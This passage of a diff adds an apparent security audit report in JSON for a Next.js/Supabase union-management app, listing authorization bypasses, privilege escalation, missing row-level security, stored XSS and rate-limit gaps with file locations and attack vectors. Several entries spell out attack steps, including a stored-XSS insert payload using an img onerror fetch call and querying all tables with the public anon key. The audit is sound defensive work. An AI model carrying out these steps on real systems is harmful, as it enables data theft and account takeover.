+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/client.ts",
+      "attack_vector": "Authenticated user opens DevTools, runs role update query, then navigates to admin pages which now pass the middleware role check.",
+      "impact": "Any registered user can become SYSTEM_ADMIN, gaining access to all admin functions."
+    },
+    {
+      "severity": "Critical",
+      "type": "AuthBypass",
+      "title": "useApproveUser/useRejectUser bypass server-side auth",
+      "description": "Client-side hooks directly update users table via Supabase client without API route authentication. The API route /api/members/approve has proper auth, but the React hooks bypass it.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts:1013-1099",
+      "attack_vector": "Any authenticated user calls the useApproveUser mutation with any pending user's ID.",
+      "impact": "Non-admin users can approve or reject membership applications."
+    },
+    {
+      "severity": "Critical",
+      "type": "DataExposure",
+      "title": "Supabase anon key grants full DB access without authentication",
+      "description": "NEXT_PUBLIC_SUPABASE_ANON_KEY is publicly visible. Without RLS, this key alone grants SELECT access to all tables. Even unauthenticated visitors can extract the key and query the database.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/client.ts",
+      "attack_vector": "Extract anon key from page source. Use @supabase/supabase-js to query any table without authentication.",
+      "impact": "Complete data exposure of all 34 tables to any internet user."
+    },
+    {
+      "severity": "High",
+      "type": "AuthBypass",
+      "title": "Comment update mutation lacks ownership check",
+      "description": "useUpdateComment updates comments without verifying the caller is the author. Delete has .eq('author_id', userId) but update does not.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/comment/api/useCommentHook.ts:212-223",
+      "attack_vector": "Call useUpdateComment mutation with any comment ID and new content.",
+      "impact": "Any authenticated user can modify any comment's content across all unions."
+    },
+    {
+      "severity": "High",
+      "type": "AuthBypass",
+      "title": "Notice delete lacks author/admin ownership check",
+      "description": "useDeleteNotice deletes by ID only without checking author or admin status. Unlike free_board delete which has author_id check.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts:511",
+      "attack_vector": "Any authenticated user can delete any notice from any union.",
+      "impact": "Unauthorized deletion of critical union communications."
+    },
+    {
+      "severity": "High",
+      "type": "LogicBug",
+      "title": "Free board cascade delete ordering causes orphan data",
+      "description": "Deletes storage files, DB files, and comments BEFORE checking post ownership. Failed ownership check leaves corrupted post.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/free-board/api/useFreeBoardHook.ts:391-422",
+      "attack_vector": "Non-admin calls useDeleteFreeBoard with another user's post ID.",
+      "impact": "Data destruction without authorization. Posts left without attachments/comments."
+    },
+    {
+      "severity": "High",
+      "type": "PrivilegeEscalation",
+      "title": "useUpdateUserRole allows SYSTEM_ADMIN assignment by regular ADMIN",
+      "description": "Accepts any role string without privilege hierarchy validation.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts:1106-1113",
+      "attack_vector": "Admin assigns SYSTEM_ADMIN role to any user.",
+      "impact": "Admin can create SYSTEM_ADMIN accounts with system-wide access."
+    },
+    {
+      "severity": "High",
+      "type": "AuthBypass",
+      "title": "Cross-union admin operations via direct hooks",
+      "description": "useUpdateExecutiveStatus/Title/SortOrder and useUpdateOwnershipType lack union_id filtering. Only filter by user/property ID.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts:1173-1221, 727-733",
+      "attack_vector": "Admin of union A targets user IDs from union B.",
+      "impact": "Cross-union privilege escalation and data modification."
+    },
+    {
+      "severity": "High",
+      "type": "AuthBypass",
+      "title": "useAnswerQuestion and useDeleteAnswer lack admin check",
+      "description": "useAnswerQuestion only checks user login, not admin role. useDeleteAnswer has no authorization at all.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/question/api/useQuestionHook.ts:438-459, 528-543",
+      "attack_vector": "Regular user submits 'admin answers' or deletes legitimate answers.",
+      "impact": "Unauthorized users impersonate admins. Legitimate answers can be deleted."
+    },
+    {
+      "severity": "High",
+      "type": "XSS",
+      "title": "Stored XSS via direct database insertion (bypassing client sanitization)",
+      "description": "DOMPurify sanitize() only runs client-side. Content stored raw in DB. Direct Supabase insert bypasses sanitization.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/utils/sanitize.ts (client-only)",
+      "attack_vector": "Direct supabase.from('notices').insert({content:'<img src=x onerror=fetch(...)>'}).",
+      "impact": "Cookie theft, session hijacking, phishing via injected content."
+    },
+    {
+      "severity": "High",
+      "type": "DoS",
+      "title": "No rate limiting on any endpoint",
+      "description": "No rate limiting exists anywhere. SMS endpoint, token validation, content creation all unprotected.",
+      "location": "All API routes and middleware",
+      "attack_vector": "Automated script sending thousands of requests.",
+      "impact": "Financial damage (SMS costs), service degradation, token brute-force."
+    },
+    {
+      "severity": "Medium",
+      "type": "WeakCSP",
+      "title": "CSP allows unsafe-eval and unsafe-inline for scripts",
+      "description": "script-src includes 'unsafe-eval' and 'unsafe-inline', reducing XSS protection.",
+      "location": "/Users/inju/workspace/johapon_v01/next.config.ts:93",
+      "attack_vector": "Stored XSS payloads execute due to permissive CSP.",
+      "impact": "CSP provides minimal protection against script injection."
+    },
+    {
+      "severity": "Medium",
+      "type": "TOCTOU",
+      "title": "Access token usage count race condition",
+      "description": "Token validation reads usage_count then updates separately. Concurrent requests bypass max_usage.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts:145-172",
+      "attack_vector": "Multiple simultaneous requests with the same tokenKey.",
+      "impact": "Access tokens used beyond max_usage limit."
+    },
+    {
+      "severity": "Medium",
+      "type": "LIKEInjection",
+      "title": "useAdminUsers search lacks LIKE wildcard escape",
+      "description": "Search query passed directly to .ilike() without escapeLikeWildcards().",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts:990-991",
+      "attack_vector": "Enter '%' to match all records, use '_' patterns for data enumeration.",
+      "impact": "Information disclosure through enhanced search queries."
+    },
+    {
+      "severity": "Medium",
+      "type": "InfoLeak",
+      "title": "Auth callback excessive debug logging",
+      "description": "40+ console.log statements expose auth user IDs, provider info, session details in production logs.",
+      "location": "/Users/inju/workspace/johapon_v01/app/auth/callback/route.ts:23-253",
+      "attack_vector": "PII exposure through log aggregation systems.",
+      "impact": "Sensitive user data in production logs."
+    },
+    {
+      "severity": "Medium",
+      "type": "InfoLeak",
+      "title": "register-prefill cookie not httpOnly",
+      "description": "Cookie containing PII (name, phone) set with httpOnly: false.",
+      "location": "/Users/inju/workspace/johapon_v01/app/auth/callback/route.ts:218",
+      "attack_vector": "XSS payload reads document.cookie to exfiltrate PII.",
+      "impact": "PII exposure via cookie theft."
+    },
+    {
+      "severity": "Medium",
+      "type": "CostAmplification",
+      "title": "SMS API accepts unlimited recipients",
+      "description": "No limit on recipients array size in SMS send endpoint.",
+      "location": "/Users/inju/workspace/johapon_v01/app/api/sms/send/route.ts:64",
+      "attack_vector": "POST with 50,000 recipients in a single request.",
+      "impact": "Financial damage through SMS cost amplification."
+    },
+    {
+      "severity": "Medium",
+      "type": "MissingScope",
+      "title": "Content update mutations lack union_id scoping",
+      "description": "useUpdateNotice, useUpdateQuestion, useUpdateFreeBoard all update by ID only without union_id filter.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts:432",
+      "attack_vector": "Admin enumerates IDs and modifies content in other unions.",
+      "impact": "Cross-union content modification."
+    },
+    {
+      "severity": "Low",
+      "type": "TimingAttack",
+      "title": "Internal API key comparison not constant-time",
+      "description": "authenticateServiceRequest uses === for API key comparison.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/api/auth.ts:138",
+      "attack_vector": "Repeated requests measuring response times to brute-force key.",
+      "impact": "Potential internal API key extraction."
+    },
+    {
+      "severity": "Low",
+      "type": "InfoLeak",
+      "title": "Token key exposure in URL parameter",
+      "description": "Access token keys in URL query strings logged in server logs, browser history, Referrer headers.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts:284",
+      "attack_vector": "Token leaked via Referrer header to external resources.",
+      "impact": "Access token exposure."
+    },
+    {
+      "severity": "Low",
+      "type": "InfoLeak",
+      "title": "Error messages expose internal state",
+      "description": "Error responses expose user_status values and raw error messages.",
+      "location": "/Users/inju/workspace/johapon_v01/app/api/members/approve/route.ts:112",
+      "attack_vector": "Error probing to map internal state machine.",
+      "impact": "Aids attacker reconnaissance."
+    },
+    {
+      "severity": "Low",
+      "type": "DoS",
+      "title": "View count RPC can be called without server-side dedup",
+      "description": "View count RPCs have only client-side sessionStorage dedup. Can be called directly to inflate counts.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts:558",
+      "attack_vector": "Script calling RPC in a loop to inflate view counts.",
+      "impact": "Artificial view count inflation."
+    },
+    {
+      "severity": "Low",
+      "type": "InfoLeak",
+      "title": "SMS API leaks error details in development mode",
+      "description": "SMS route exposes error.message when NODE_ENV is development.",
+      "location": "/Users/inju/workspace/johapon_v01/app/api/sms/send/route.ts:132",
+      "attack_vector": "If dev server is accidentally exposed, error details aid attacks.",
+      "impact": "Internal error message exposure in development."
+    }
+  ],
+  "top_3_risks": [
+    "NO RLS ON ANY TABLE: The single most critical vulnerability. All 34+ tables are fully accessible via the Supabase anon key. This is the root cause of most other findings.",
+    "CLIENT-SIDE AUTH ONLY: All authorization checks (admin guard, ownership, union isolation) are in React components/hooks. None are enforced at the database level. Any client-side JS modification bypasses all controls.",
+    "STORED XSS POSSIBLE: Content sanitization is client-side only (DOMPurify). Direct DB insertion bypasses sanitization. Combined with permissive CSP (unsafe-inline + unsafe-eval), this creates a viable stored XSS attack chain."
+  ],
+  "executive_summary": "The application has a fundamental security architecture flaw: all authorization is implemented in client-side code with no database-level enforcement (RLS). This means every single authorization check - admin role guards, ownership verification, union isolation, blocked user enforcement - can be bypassed by any authenticated user using browser DevTools or a simple script. The Supabase anon key (publicly visible) grants unrestricted access to all 34+ tables. Combined with client-only XSS sanitization, no rate limiting, and missing ownership checks on several mutations, the application is vulnerable to complete data breach, privilege escalation, cross-union data access, stored XSS, and cost amplification attacks."
+}
